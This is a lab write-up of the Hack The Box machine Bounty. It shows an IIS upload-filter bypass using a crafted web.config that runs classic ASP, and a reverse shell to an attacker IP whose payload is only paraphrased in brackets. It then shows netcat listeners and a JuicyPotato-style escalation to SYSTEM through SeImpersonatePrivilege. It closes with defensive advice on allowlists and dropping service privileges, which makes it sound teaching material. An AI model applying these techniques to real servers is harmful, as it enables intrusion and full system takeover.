---
layout: post
title: "The Rulebook Was the Payload"
subtitle: "HTB Bounty, where the file that decides what may run is itself a file you can upload, and a service account's quiet privilege hands you the whole machine"
date: 2018-11-03 12:00:00 +0000
description: "Bounty blocks every script extension you can name, then lets you upload the rulebook that decides which extensions count, and a forgotten service privilege does the rest."
image: /assets/og/the-rulebook-was-the-payload.png
tags: [hackthebox, writeup]
---

Bounty is a box about a guard who checks every name on the list except his own. The upload form on this little IIS site refuses your scripts. It will not take an `.aspx`, will not take an `.asp`, slaps your hand for anything that smells executable. So you hand it the one file it never thought to suspect, the very rulebook that tells the server what is allowed to run, and inside that rulebook you write a new rule plus a small classic-ASP payload. The server reads its own config, obeys the rule you smuggled in, and runs your code. From there you land as a low service account named merlin, notice it is carrying a sleepy little privilege almost nobody remembers to take away, and ride that privilege straight up to SYSTEM. No memory corruption. No zero-day. Just a filter that forgot to filter the thing that defines the filter.

```
        B O U N T Y
        ===========
        upload form:  ".aspx? no. .asp? no. .php? no."
                      "web.config?  ...sure, that's just settings."
                          |
                          v
        the config you uploaded rewrites the rules,
        then runs the asp you tucked underneath it.
                          |
                          v
        a service account answers. it is carrying
        SeImpersonate, and that is a key in a coat pocket.
                                                        印
```

## 0x01 · one door, wide open

The scan is almost insultingly short. One port answers, and it is the web.

```
# nmap -p- --min-rate 5000 10.10.10.93
# nmap -p 80 -sC -sV 10.10.10.93
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
```

`IIS 7.5` with an `X-Powered-By: ASP.NET` header pins this to the Windows Server 2008 R2 era, a machine wearing a museum badge. One open port means the whole box lives behind that single web service, so everything we do has to walk through the front door. There is nowhere else to knock.

The landing page is a picture of a merlin and not much else. The interesting things never sit on the front page, so you brute the paths. `gobuster` with an `aspx` extension turns up the two files the whole box hinges on.

```
# gobuster dir -u http://10.10.10.93 -w directory-list-2.3-medium.txt -x aspx
/transfer.aspx        (Status: 200)
/uploadedFiles        (Status: 301)
```

`transfer.aspx` is a file upload form. `uploadedFiles` is the folder it drops things into. An upload form that hands you back a place to read your own uploads is an open invitation, if you can get the right kind of file through the door.

## 0x02 · the guard who never reads his own name

The form is picky. Try to upload a webshell with an honest `.aspx` name and it refuses. Rename it, try `.asp`, `.aspx;.jpg`, `.config.aspx`, every cute trick in the bag, and it keeps swatting you down. The form is running an extension blocklist, a bouncer with a clipboard of banned names, and ASP-flavored extensions are all on the list.

Here is the hinge of the entire box. On IIS, the file `web.config` is not content. It is the configuration that tells the server how to treat a folder, including which file types map to which handlers and what is allowed to execute. Picture a nightclub where the bouncer turns away anyone on his banned list, but the banned list itself is a sheet of paper sitting on a stool by the door, and nobody is watching the stool. Walk up, slip a new line onto the list, and walk in under a name you just wrote. `web.config` is that sheet of paper. It was never on the blocklist, because the blocklist is made of it.

So you craft a `web.config` that does two jobs at once. The top half is a real, valid configuration block that registers a handler telling IIS to run `.config` files through the classic ASP engine (`asp.dll`). The bottom half, tucked under the XML, is the classic ASP payload itself. IIS reads the config, learns from your own instructions that `.config` files are now executable script, and then executes the script you parked right there in the same file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="iceberg-cfg" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
  </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% [ classic ASP one-liner: run a command via WScript.Shell, here a
     powershell stager that pulls a reverse shell back to 10.10.14.4 ] %>
```

I am writing the payload in brackets on purpose, the same way I always do, because the live version is a copy-paste backdoor and the moment that exact string touches disk an antivirus quarantines it on sight. That reaction is the proof, not the punchline. The real thing is one short line, and one short line is all it takes.

Upload that `web.config`, then simply browse to where the form filed it.

```
http://10.10.10.93/uploadedFiles/web.config
```

Requesting the config triggers it. The server parses the rule, decides `.config` is now runnable, runs the ASP underneath, and your command fires as the identity IIS is running.

## 0x03 · merlin answers the phone

The payload stages a small PowerShell reverse shell (the classic Nishang `Invoke-PowerShellTcp` pattern), so stand up a listener and catch the call.

```
# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from 10.10.10.93
PS C:\windows\system32\inetsrv> whoami
bounty\merlin
```

You are `merlin`, the service account the app pool runs under. The user flag is in his profile, though it is marked hidden, so a plain directory listing skips right over it. You have to ask for the hidden ones.

```
PS> Get-ChildItem -Force C:\Users\merlin\Desktop
PS> type C:\Users\merlin\Desktop\user.txt
████████████████████████████████
```

## 0x04 · the privilege in the coat pocket

Whenever a Windows web service drops you to a shell, the first thing you check is what powers that account is quietly holding. Service accounts on older Windows almost always carry a privilege the admins never think about, because it is invisible until someone abuses it.

```
PS> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

There it is. `SeImpersonatePrivilege` lets a process pretend to be any client that connects to it, which sounds reasonable and was meant for things like a web server doing work on behalf of a logged-in user. Think of it like a hotel valet. His whole job is to drive other people's cars, so the rules let him hold any guest's keys for a moment. That is fine until you can trick the most important guest in the building, the manager, into tossing him the master keys. Then the valet, briefly and legally, is the manager.

That trick has a name in this era: the potato family, JuicyPotato being the canonical tool. The move is to make a high-privilege Windows component connect back to you and authenticate. You spin up a COM object that the SYSTEM account will instantiate (BITS and a small roster of other DCOM CLSIDs work for exactly this), point its authentication at a local listener you control on `127.0.0.1`, and when SYSTEM dials in to identify itself, `SeImpersonatePrivilege` lets you grab and wear its token. The valet caught the master keys mid-air. A quick `systeminfo` shows why nothing softer is even needed here, the box is Windows Server 2008 R2 build 7600 with `Hotfix(s): N/A`, an unpatched relic that says yes to everything.

```
PS> .\iceberg-jp.exe -t * -p C:\Users\merlin\AppData\Local\Temp\iceberg.bat ^
        -l 9999 -c {CLSID-of-a-SYSTEM-owned-DCOM-object}
[+] authresult 0
[+] CreateProcessWithTokenW OK
```

The `-p` batch just launches a second reverse shell, and the new call comes back wearing a different coat.

```
# nc -lvnp 4444
connect to [10.10.14.4] from 10.10.10.93
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

That is the box. A config file that rewrote the rules, and a privilege that handed over the crown.

## 0x05 · the honest caveat

It is easy to read Bounty as a quaint old IIS quirk and move on, and the specific `web.config` ASP trick really is patched and well understood now. But the shape of the mistake is forever. The upload form blocked a list of dangerous file types, which feels like security, and it is the same comforting half-measure people still ship today. A blocklist is a guess about every bad thing in the world, and the world keeps inventing new bad things. The form banned every extension that looked like a script and never once considered that the file controlling the rules was itself an uploadable file. You cannot enumerate your way to safety. The only durable fix is the opposite stance, an allowlist that names the handful of things that are permitted and treats everything else, `web.config` very much included, as hostile until proven otherwise.

And the privilege escalation is the part that should keep you up later than the upload bug. Nothing about `SeImpersonatePrivilege` is a vulnerability. It is a designed, documented, intended capability that web service accounts carry by default, and it has been a clean path from low-priv to SYSTEM for the better part of a decade through one renamed potato after another. You do not patch your way out of that with a Tuesday update. You fix it by not running internet-facing services under accounts that hold god-tier impersonation rights, and by remembering that every privilege a process holds is a privilege an attacker inherits the second they land in it.

## 0x06 · outro

```
the bouncer turned away every banned name on his list.
then you handed him the list, with your name freshly written in.

the service account answered, carrying a key it never used.
you used it.

read the whole filter. allow, never block. drop the privilege you don't need.
wear black.

                                                            EOF
```

---

*HTB: Bounty, retired 27 Oct 2018. An easy Windows box that is really a lecture on allowlists, told through the one file a blocklist forgets to check, then a service privilege that was always going to say yes.*